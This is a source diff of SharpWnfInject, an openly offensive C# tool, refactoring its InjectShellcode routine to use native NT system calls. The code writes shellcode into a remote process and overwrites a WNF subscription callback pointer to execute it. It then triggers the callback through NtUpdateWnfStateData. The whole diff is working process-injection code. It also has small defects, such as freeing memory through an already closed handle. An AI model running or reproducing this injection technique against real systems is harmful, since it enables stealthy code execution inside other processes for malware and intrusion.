@@ -1,14 +1,17 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.ComponentModel;
 using System.IO;
 using System.Linq;
+using System.Net.NetworkInformation;
 using System.Runtime.InteropServices;
 using System.Security;
 using SharpWnfInject.Interop;
 
 namespace SharpWnfInject.Library
 {
+    using NTSTATUS = Int32;
+    using SIZE_T = UIntPtr;
+
     internal class Modules
     {
         public static bool InjectShellcode(
@@ -114,301 +117,272 @@ namespace SharpWnfInject.Library
             byte[] shellcode,
             bool debug)
         {
-            int ntstatus;
-            int error;
-            PeProcess proc;
-            bool is64bit;
-            ulong stateNameToInject = 0UL;
-            Dictionary<ulong, IntPtr> nameSubscriptions;
-            Dictionary<IntPtr, Dictionary<IntPtr, IntPtr>> userSubscriptions;
-            Dictionary<IntPtr, IntPtr> callback;
-            IntPtr pUserSubscription;
-            IntPtr pCallbackPointer;
-            IntPtr pShellcode;
-            IntPtr pCallbackOrigin;
-            IntPtr lpNumberOfBytesWritten;
-            uint nOffsetCallback;
-            uint nBytesWritten;
+            NTSTATUS ntstatus;
+            IntPtr pInfoBuffer;
+            bool bIs32BitProcess;
+            string imageFileName;
+            string processName;
+            string wellKnownName = Helpers.GetWnfName(stateName);
+            var objectAttributes = new OBJECT_ATTRIBUTES
+            {
+                Length = Marshal.SizeOf(typeof(OBJECT_ATTRIBUTES))
+            };
+            var clientId = new CLIENT_ID { UniqueProcess = new IntPtr(pid) };
+            var pShellcodeBuffer = IntPtr.Zero;
+            var bSuccess = false;
 
             if (debug)
             {
-                Console.WriteLine("[>] Trying to enable SeDebugPrivilege.");
-
                 if (Utilities.EnableDebugPrivilege())
-                    Console.WriteLine("    |-> Status : SUCCESS");
-                else
-                    Console.WriteLine("    |-> Status : FAILED");
-            }
-
-            Console.WriteLine("[>] Trying to open the target process.");
-
-            try
-            {
-                proc = new PeProcess(pid);
-            }
-            catch (ArgumentException ex)
-            {
-                Console.WriteLine("[!] Failed to open the specified process.");
-                Console.WriteLine("    |-> {0}\n", ex.Message);
-
-                return false;
-            }
-            catch (KeyNotFoundException ex)
-            {
-                Console.WriteLine("[!] Failed to open the specified process.");
-                Console.WriteLine("    |-> {0}\n", ex.Message);
-
-                return false;
-            }
-            catch (Win32Exception ex)
-            {
-                Console.WriteLine("[!] Failed to open the specified process.");
-                Console.WriteLine("    |-> {0}\n", ex.Message);
-
-                return false;
-            }
-
-            is64bit = (proc.GetArchitecture() == "x64");
-
-            Console.WriteLine("[+] Target process is opened successfully.");
-            Console.WriteLine("    |-> Process Name : {0}", proc.GetProcessName());
-            Console.WriteLine("    |-> Process ID   : {0}", proc.GetProcessId());
-            Console.WriteLine("    |-> Architecture : {0}", proc.GetArchitecture());
-            Console.WriteLine("[>] Trying to get WNF_SUBSCRIPTION_TABLE.");
-
-            IntPtr pSubscriptionTable = Utilities.GetSubscriptionTable(proc);
-
-            if (pSubscriptionTable == IntPtr.Zero)
-            {
-                Console.WriteLine("[-] Failed to get valid WNF_SUBSCRIPTION_TABLE.");
-                proc.Dispose();
-
-                return false;
-            }
-            else
-            {
-                Console.WriteLine("[+] Got valid WNF_SUBSCRIPTION_TABLE.");
-                Console.WriteLine("    |-> Address : 0x{0}", pSubscriptionTable.ToString(is64bit ? "X16" : "X8"));
-            }
-
-            Console.WriteLine("[>] Trying to get WNF_NAME_SUBSCRIPTION(s).");
-
-            if (Header.g_IsWin11)
-                nameSubscriptions = Utilities.GetNameSubscriptionsWin11(proc, pSubscriptionTable);
-            else
-                nameSubscriptions = Utilities.GetNameSubscriptions(proc, pSubscriptionTable);
-
-            if (nameSubscriptions.Count == 0)
-            {
-                Console.WriteLine("[-] Failed to get WNF_NAME_SUBSCRIPTION.");
-                proc.Dispose();
-
-                return false;
-            }
-            else
-            {
-                Console.WriteLine("[+] Got {0} WNF_NAME_SUBSCRIPTION(s).", nameSubscriptions.Count);
-                Console.WriteLine("[>] Searching the WNF_NAME_SUBSCRIPTION for the specified WNF State Name.");
-
-                foreach (var key in nameSubscriptions.Keys)
                 {
-                    if (key == stateName)
-                    {
-                        stateNameToInject = key;
-
-                        break;
-                    }
+                    Console.WriteLine("[+] SeDebugPrivilege is enabled successfully.");
                 }
-
-                if (stateNameToInject == 0UL)
+                else
                 {
-                    Console.WriteLine("[-] The target process does not use the specified WNF State Name.");
-                    Console.WriteLine(
-                        "    |-> WNF State Name : 0x{0} ({1})",
-                        stateName.ToString("X16"),
-                        Helpers.GetWnfName(stateName));
-
-                    proc.Dispose();
-
+                    Console.WriteLine("[-] Failed to enable SeDebugPrivilege.");
                     return false;
                 }
-                else
-                {
-                    Console.WriteLine("[+] Got WNF_NAME_SUBSCRIPTION for the specified WNF State Name.");
-                    Console.WriteLine(
-                        "    |-> WNF State Name : {0} (0x{1})",
-                        Helpers.GetWnfName(stateNameToInject),
-                        stateNameToInject.ToString("X16"));
-                    Console.WriteLine(
-                        "    |-> Address        : 0x{0}",
-                        nameSubscriptions[stateNameToInject].ToString(is64bit ? "X16" : "X8"));
-                }
             }
 
-            Console.WriteLine("[>] Trying to get WNF_USER_SUBSCRIPTION(s) for the target WNF_NAME_SUBSCRIPTION.");
-
-            if (Header.g_IsWin11)
-                userSubscriptions = Utilities.GetUserSubscriptionsWin11(proc, nameSubscriptions[stateNameToInject]);
-            else
-                userSubscriptions = Utilities.GetUserSubscriptions(proc, nameSubscriptions[stateNameToInject]);
-
-            if (userSubscriptions.Count == 0)
-            {
-                Console.WriteLine("[-] No WNF_USER_SUBSCRIPTION.");
-                proc.Dispose();
-
-                return false;
-            }
-            else
-            {
-                Console.WriteLine("[+] Got {0} WNF_USER_SUBSCRIPTION(s).", userSubscriptions.Count);
-            }
-
-            pUserSubscription = userSubscriptions.Keys.First();
-            callback = userSubscriptions[pUserSubscription];
-            pCallbackOrigin = callback.Keys.First();
-
-            if (is64bit)
-            {
-                nOffsetCallback = (uint)Marshal.OffsetOf(
-                    typeof(WNF_USER_SUBSCRIPTION64),
-                    "Callback");
-            }
-            else
-            {
-                nOffsetCallback = (uint)Marshal.OffsetOf(
-                    typeof(WNF_USER_SUBSCRIPTION32),
-                    "Callback");
-            }
-
-            pCallbackPointer = new IntPtr(userSubscriptions.Keys.First().ToInt64() + nOffsetCallback);
-
-            Console.WriteLine("[>] Trying to inject shellccode to the following WNF_USER_SUBSCRIPTION.");
-            Console.WriteLine(
-                "    |-> Address  : 0x{0}",
-                pUserSubscription.ToString(is64bit ? "X16" : "X8"));
-            Console.WriteLine(
-                "    |-> Callback : 0x{0} ({1})",
-                pCallbackOrigin.ToString(is64bit ? "X16" : "X8"),
-                Helpers.GetSymbolPath(proc.GetProcessHandle(), pCallbackOrigin));
-            Console.WriteLine(
-                "    |-> Context  : 0x{0} ({1})",
-                callback[pCallbackOrigin].ToString(is64bit ? "X16" : "X8"),
-                Helpers.GetSymbolPath(proc.GetProcessHandle(), callback[pCallbackOrigin]));
-
-            if (Environment.Is64BitProcess && !is64bit)
-                Console.WriteLine("    |-> Warning  : To get detailed symbol information of WOW64 process, should be built as 32bit binary.");
-
-            Console.WriteLine("[>] Trying to allocate shellcode buffer in remote process.");
-
-            pShellcode = NativeMethods.VirtualAllocEx(
-                proc.GetProcessHandle(),
-                IntPtr.Zero,
-                (uint)shellcode.Length,
-                MemoryAllocationFlags.MEM_COMMIT | MemoryAllocationFlags.MEM_RESERVE,
-                MemoryProtectionFlags.PAGE_EXECUTE_READ);
-
-            if (pShellcode == IntPtr.Zero)
-            {
-                error = Marshal.GetLastWin32Error();
-                Console.WriteLine("[-] Failed to allocate shellcode buffer.");
-                Console.WriteLine("    |-> {0}.", Helpers.GetWin32ErrorMessage(error, false));
-                proc.Dispose();
-
-                return false;
-            }
-            else
-            {
-                Console.WriteLine("[+] Shellcode buffer is allocated successfully.");
-                Console.WriteLine("    |-> Shellcode buffer : 0x{0}", pShellcode.ToString(is64bit ? "X16" : "X8"));
-            }
-
-            Console.WriteLine("[>] Trying to write shellcode to remote process.");
-
-            lpNumberOfBytesWritten = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(uint)));
-
-            if (!NativeMethods.WriteProcessMemory(
-                proc.GetProcessHandle(),
-                pShellcode,
-                shellcode,
-                (uint)shellcode.Length,
-                lpNumberOfBytesWritten))
-            {
-                error = Marshal.GetLastWin32Error();
-                Console.WriteLine("[-] Failed to write shellcode to buffer.");
-                Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
-                Marshal.FreeHGlobal(lpNumberOfBytesWritten);
-                proc.Dispose();
-
-                return false;
-            }
-            else
-            {
-                nBytesWritten = (uint)Marshal.ReadInt32(lpNumberOfBytesWritten);
-                Marshal.FreeHGlobal(lpNumberOfBytesWritten);
-                Console.WriteLine("[+] Shellcode are written successfully.");
-                Console.WriteLine("    |-> Shellcode Length : {0} byte(s)", nBytesWritten);
-            }
-
-            Console.WriteLine("[>] Trying to overwrite callback function pointer.");
-
-            if (!NativeMethods.WriteProcessMemory(
-                    proc.GetProcessHandle(),
-                    pCallbackPointer,
-                    is64bit ? BitConverter.GetBytes(pShellcode.ToInt64()) : BitConverter.GetBytes(pShellcode.ToInt32()),
-                    is64bit ? 8u: 4u,
-                    IntPtr.Zero))
-            {
-                error = Marshal.GetLastWin32Error();
-                Console.WriteLine("[-] Failed to overwrite callback function pointer.");
-                Console.WriteLine("    |-> {0}.", Helpers.GetWin32ErrorMessage(error, false));
-                proc.Dispose();
-
-                return false;
-            }
-            else
-            {
-                Console.WriteLine("[+] Callback function pointer is overwritten successfully.");
-            }
-
-            ntstatus = NativeMethods.NtUpdateWnfStateData(
-                in stateNameToInject,
-                IntPtr.Zero,
-                0,
-                IntPtr.Zero,
-                IntPtr.Zero,
-                0,
-                0);
+            ntstatus = NativeMethods.NtOpenProcess(
+                out IntPtr hProcess,
+                ACCESS_MASK.PROCESS_QUERY_LIMITED_INFORMATION | ACCESS_MASK.PROCESS_VM_OPERATION | ACCESS_MASK.PROCESS_VM_READ | ACCESS_MASK.PROCESS_VM_WRITE,
+                in objectAttributes,
+                in clientId);
 
             if (ntstatus != Win32Consts.STATUS_SUCCESS)
             {
-                Console.WriteLine("[-] Failed to update WNF State Data.");
-                Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
+                Console.WriteLine("[-] Failed to get handle from the target process (NTSTATUS = 0x{0}).", ntstatus.ToString("X8"));
+                return false;
             }
-            else
+
+            bIs32BitProcess = Helpers.Is32BitProcess(hProcess);
+            imageFileName = Helpers.GetProcessImageFileName(hProcess);
+            processName = string.IsNullOrEmpty(imageFileName) ? "(N/A)" : Path.GetFileName(imageFileName);
+
+            Console.WriteLine("[*] Target WNF State Name is 0x{0} ({1}).", stateName.ToString("X16"), wellKnownName);
+            Console.WriteLine("[+] Got a handle from the target Process");
+            Console.WriteLine("    [*] Process Name    : {0}", processName);
+            Console.WriteLine("    [*] Process ID      : {0}", pid);
+            Console.WriteLine("    [*] Image File Name : {0}", imageFileName);
+            Console.WriteLine("    [*] Architecture    : {0}", Helpers.GetProcessArchitecture(hProcess).ToString());
+
+            pInfoBuffer = Marshal.AllocHGlobal(shellcode.Length);
+            Marshal.Copy(shellcode, 0, pInfoBuffer, shellcode.Length);
+
+            do
             {
-                Console.WriteLine("[+] WNF State Data is updated successfully.");
-            }
+                IntPtr pSubscriptionTable;
+                IntPtr pSavedCallback;
+                IntPtr pCallbackPointer;
+                IntPtr pUserSubscription;
+                uint nCallbackOffset;
+                Dictionary<ulong, IntPtr> nameSubscriptions;
+                Dictionary<IntPtr, KeyValuePair<IntPtr, IntPtr>> userSubscriptions;
+                uint nPointerSize = bIs32BitProcess ? 4u : 8u;
+                string addressFormat = Environment.Is64BitProcess ? "X16" : "X8";
+                IntPtr pTablePointer = Utilities.GetSubscriptionTablePointerAddress(hProcess);
+                var nBufferLength = new SIZE_T((uint)shellcode.Length);
 
-            Console.WriteLine("[>] Trying to revert callback function pointer.");
+                if (!bIs32BitProcess)
+                    nCallbackOffset = (uint)Marshal.OffsetOf(typeof(WNF_USER_SUBSCRIPTION64), "Callback");
+                else
+                    nCallbackOffset = (uint)Marshal.OffsetOf(typeof(WNF_USER_SUBSCRIPTION32), "Callback");
 
-            if (!NativeMethods.WriteProcessMemory(
-                    proc.GetProcessHandle(),
+                if (pTablePointer == IntPtr.Zero)
+                {
+                    Console.WriteLine("[-] Failed to get pointer for WNF_SUBSCRIPTION_TABLE.");
+                    break;
+                }
+                else
+                {
+                    Console.WriteLine("[+] Pointer for WNF_SUBSCRIPTION_TABLE is at 0x{0}.", pTablePointer.ToString(addressFormat));
+                }
+
+                pSubscriptionTable = Utilities.GetSubscriptionTable(hProcess, pTablePointer);
+
+                if (pSubscriptionTable == IntPtr.Zero)
+                {
+                    Console.WriteLine("[-] Failed to get WNF_SUBSCRIPTION_TABLE.");
+                    break;
+                }
+                else
+                {
+                    Console.WriteLine("[+] WNF_SUBSCRIPTION_TABLE is at 0x{0}.", pSubscriptionTable.ToString(addressFormat));
+                }
+
+                if (Globals.g_IsWin11)
+                    nameSubscriptions = Utilities.GetNameSubscriptionsWin11(hProcess, pSubscriptionTable);
+                else
+                    nameSubscriptions = Utilities.GetNameSubscriptions(hProcess, pSubscriptionTable);
+
+                if (nameSubscriptions.Count == 0)
+                {
+                    Console.WriteLine("[-] Failed to get WNF_NAME_SUBSCRIPTION.");
+                    break;
+                }
+
+                if (!nameSubscriptions.ContainsKey(stateName))
+                {
+                    Console.WriteLine("[-] Target process does not use the WNF State Name.");
+                    break;
+                }
+                else
+                {
+                    Console.WriteLine("[*] WNF_NAME_SUBSCRIPTION is at 0x{0}.", nameSubscriptions[stateName].ToString(addressFormat));
+                }
+
+                userSubscriptions = Utilities.GetUserSubscriptions(hProcess, nameSubscriptions[stateName]);
+
+                if (userSubscriptions.Count == 0)
+                {
+                    Console.WriteLine("[-] No WNF_USER_SUBSCRIPTION.");
+                    break;
+                }
+                else
+                {
+                    Console.WriteLine("[+] Got {0} WNF_USER_SUBSCRIPTION.", userSubscriptions.Count);
+                }
+
+                pUserSubscription = userSubscriptions.Keys.First();
+                pSavedCallback = userSubscriptions[pUserSubscription].Key;
+
+                if (Environment.Is64BitProcess)
+                    pCallbackPointer = new IntPtr(pUserSubscription.ToInt64() + nCallbackOffset);
+                else
+                    pCallbackPointer = new IntPtr(pUserSubscription.ToInt32() + (int)nCallbackOffset);
+
+                Console.WriteLine("[*] Target callback pointer is at 0x{0}. Points to 0x{1} ({2}).",
+                    pCallbackPointer.ToString(addressFormat),
+                    pSavedCallback.ToString(addressFormat),
+                    Helpers.GetSymbolPath(hProcess, pSavedCallback) ?? "N/A");
+
+                ntstatus = NativeMethods.NtAllocateVirtualMemory(
+                    hProcess,
+                    ref pShellcodeBuffer,
+                    SIZE_T.Zero,
+                    ref nBufferLength,
+                    ALLOCATION_TYPE.COMMIT | ALLOCATION_TYPE.RESERVE,
+                    MEMORY_PROTECTION.PAGE_READWRITE);
+
+                if (ntstatus != Win32Consts.STATUS_SUCCESS)
+                {
+                    Console.WriteLine("[-] Failed to allocate shellcode buffer (BTSTATUS = 0x{0}).", ntstatus.ToString("X8"));
+                    break;
+                }
+                else
+                {
+                    Console.WriteLine("[+] Shellcode buffer is at 0x{0}.", pShellcodeBuffer.ToString(addressFormat));
+                }
+
+                ntstatus = NativeMethods.NtWriteVirtualMemory(
+                    hProcess,
+                    pShellcodeBuffer,
+                    pInfoBuffer,
+                    (uint)shellcode.Length,
+                    out uint nWrittenBytes);
+
+                if ((ntstatus != Win32Consts.STATUS_SUCCESS) || (nWrittenBytes != (uint)shellcode.Length))
+                {
+                    Console.WriteLine("[-] Failed to write shellcode (BTSTATUS = 0x{0}).", ntstatus.ToString("X8"));
+                    break;
+                }
+                else
+                {
+                    Console.WriteLine("[+] {0} bytes shellcode is written successfully.", shellcode.Length);
+                }
+
+                ntstatus = NativeMethods.NtProtectVirtualMemory(
+                    hProcess,
+                    ref pShellcodeBuffer,
+                    ref nWrittenBytes,
+                    MEMORY_PROTECTION.PAGE_EXECUTE_READ,
+                    out MEMORY_PROTECTION _);
+
+                if (ntstatus != Win32Consts.STATUS_SUCCESS)
+                {
+                    Console.WriteLine("[-] Failed to update shellcode buffer protection (BTSTATUS = 0x{0}).", ntstatus.ToString("X8"));
+                    break;
+                }
+
+                if (!bIs32BitProcess)
+                    Marshal.WriteInt64(pInfoBuffer, pShellcodeBuffer.ToInt64());
+                else
+                    Marshal.WriteInt32(pInfoBuffer, pShellcodeBuffer.ToInt32());
+
+                ntstatus = NativeMethods.NtWriteVirtualMemory(
+                    hProcess,
                     pCallbackPointer,
-                    is64bit ? BitConverter.GetBytes(pCallbackOrigin.ToInt64()) : BitConverter.GetBytes(pCallbackOrigin.ToInt32()),
-                    is64bit ? 8u : 4u,
-                    IntPtr.Zero))
+                    pInfoBuffer,
+                    nPointerSize,
+                    out nWrittenBytes);
+
+                if ((ntstatus != Win32Consts.STATUS_SUCCESS) || (nWrittenBytes != nPointerSize))
+                {
+                    Console.WriteLine("[-] Failed to overwrite callback pointer (BTSTATUS = 0x{0}).", ntstatus.ToString("X8"));
+                    break;
+                }
+                else
+                {
+                    Console.WriteLine("[+] Callback pointer is overwritten successfully.");
+                }
+
+                Console.WriteLine("[>] Triggering shellcode.");
+
+                ntstatus = NativeMethods.NtUpdateWnfStateData(
+                    in stateName,
+                    IntPtr.Zero,
+                    0,
+                    IntPtr.Zero,
+                    IntPtr.Zero,
+                    0,
+                    0);
+
+                if (ntstatus != Win32Consts.STATUS_SUCCESS)
+                {
+                    Console.WriteLine("[-] Failed to update WNF State Data (NTSTATUS = 0x{0}).", ntstatus.ToString("X8"));
+                    break;
+                }
+                else
+                {
+                    bSuccess = true;
+                    Console.WriteLine("[+] WNF State Data is updated successfully. Shellcode might be executed.");
+                }
+
+                if (!bIs32BitProcess)
+                    Marshal.WriteInt64(pInfoBuffer, pSavedCallback.ToInt64());
+                else
+                    Marshal.WriteInt32(pInfoBuffer, pSavedCallback.ToInt32());
+
+                ntstatus = NativeMethods.NtWriteVirtualMemory(
+                    hProcess,
+                    pCallbackPointer,
+                    pInfoBuffer,
+                    nPointerSize,
+                    out nWrittenBytes);
+
+                if ((ntstatus != Win32Consts.STATUS_SUCCESS) || (nWrittenBytes != nPointerSize))
+                    Console.WriteLine("[-] Failed to revert callback pointer (NTSTATUS = 0x{0}).", ntstatus.ToString("X8"));
+                else
+                    Console.WriteLine("[+] Callback pointer is reverted successfully.");
+            } while (false);
+
+            Marshal.FreeHGlobal(pInfoBuffer);
+            NativeMethods.NtClose(hProcess);
+
+            if (!bSuccess && (pShellcodeBuffer != IntPtr.Zero))
             {
-                Console.WriteLine("[-] Failed to revert callback function pointer.");
-            }
-            else
-            {
-                Console.WriteLine("[+] Callback function pointer is reverted successfully.");
+                var nRegionSize = SIZE_T.Zero;
+                NativeMethods.NtFreeVirtualMemory(
+                    hProcess,
+                    ref pShellcodeBuffer,
+                    ref nRegionSize,
+                    ALLOCATION_TYPE.RELEASE);
             }
 
-            proc.Dispose();
+            Console.WriteLine("[*] Done.");
 
-            return (ntstatus == Win32Consts.STATUS_SUCCESS);
+            return bSuccess;
         }
     }
 }
